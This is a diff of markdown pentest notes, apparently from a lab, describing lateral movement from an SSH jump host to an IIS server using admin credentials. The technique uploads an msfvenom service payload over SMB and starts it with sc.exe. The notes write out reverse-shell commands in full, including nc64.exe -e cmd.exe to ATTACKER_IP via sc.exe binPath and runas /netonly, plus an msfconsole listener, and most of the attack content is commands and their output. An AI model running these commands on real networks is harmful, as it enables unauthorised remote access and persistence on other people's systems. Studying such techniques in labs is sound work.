@@ -14,7 +14,9 @@ b. IIS (`iis.test.com`)
 
 Let's assume that the Intermediary server have no data that will be interesting to us, and it simply functions as an intermediary to get to the _IIS_ server. The main goal is the _IIS_ server, which is only accessible/routable from the intermediary server due to network restrictions, firewalls, etc.
 
-The first set of AD credential allows us to gain a remote shell session on the intermediary machine (`jmp.domain`), via SSH. From there, we can use the obtained admin credentials to move laterally to the _IIS_ server (`iis.domain`), to gain a remote session with administrative privileges.
+The first set of AD credential allows us to gain a remote shell session on the intermediary machine (`jmp.domain`), via SSH.&#x20;
+
+However, the _IIS_ server does not expose a SSH service. Thus, we need to make use of the session we have on the intermediary server to move laterally to the _IIS_ server (`iis.domain`) using the obtained admin credentials, to gain a remote session with administrative privileges.&#x20;
 
 ### (1) Using `sc.exe`
 
@@ -35,21 +37,7 @@ user
 
 #### 2. Craft the reverse shell payload (`msfvenom`) and upload it to the IIS server (with admin credentials)
 
-> Note that the reverse shell connection will fail If we tried to initiate it directly with `sc.exe` using the `binPath` option:
-
-{% code title="Attacker" overflow="wrap" %}
-```sh
-$ sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443" start= auto
-
-$ sc.exe \\TARGET start <servicename>
-```
-{% endcode %}
-
-This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided.
-
-**Alternative solution**
-
-As a workaround, we can use `msfvenom` which allows us to craft a payload in the `exe-service` format, which allows us to encapsulate our payload inside a fully functional service executable.
+We can use `msfvenom`  to craft a payload in the `exe-service` format, which allows us to encapsulate our payload inside a fully functional service executable.
 
 {% code title="Attacker" overflow="wrap" %}
 ```sh
@@ -79,7 +67,7 @@ $smbclient -c "put <service_exec_name>.exe" -U admin -W xxx '//iis.test.com/admi
 
 _Start the msfconsole listener:_
 
-{% code overflow="wrap" %}
+{% code title="Attacker" overflow="wrap" %}
 ```sh
 $ msfconsole
 msf6> use exploit/multi/handler
@@ -112,11 +100,20 @@ C:\> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd.exe ATTAC
 ```
 {% endcode %}
 
+The listener on port **8888** will receive a remote command prompt on `jmp.test.com` as the admin:
+
+{% code title="jmp.test.com (admin)" %}
+```
+C:\> whoami
+admin
+```
+{% endcode %}
+
 #### 4. Start a service (`sc.exe`) on the _IIS_ server that automatically executes the uploaded reverse shell payload
 
 Now, with a shell session as the admin, we can create a service executable that calls our uploaded `msfvenom` payload created earlier:
 
-{% code title="Attacker" overflow="wrap" %}
+{% code title="jmp.test.com (admin)" overflow="wrap" %}
 ```powershell
 # start powershell
 C:\> powershell
@@ -126,9 +123,25 @@ PS> sc.exe \\iis.test.com start rvshell
 ```
 {% endcode %}
 
-After performing the following actions, we will retrieve a reverse shell connection from the `msfconsole` session earlier:
+After performing the following actions, we will retrieve a reverse shell connection from the `msfconsole` session earlier anytime the _IIS_ server starts:
 
+{% code title="iis.test.com (admin)" %}
 ```
 C:\> whoami
 admin
 ```
+{% endcode %}
+
+**Additional notes**
+
+Note that it will not work if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:
+
+{% code title="Attacker (admin)" overflow="wrap" %}
+```sh
+$ sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443" start= auto
+
+$ sc.exe \\TARGET start <servicename>
+```
+{% endcode %}
+
+This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided. The method we have explored with `msfvenom` works as it encapsulates the payload within a valid service executable.
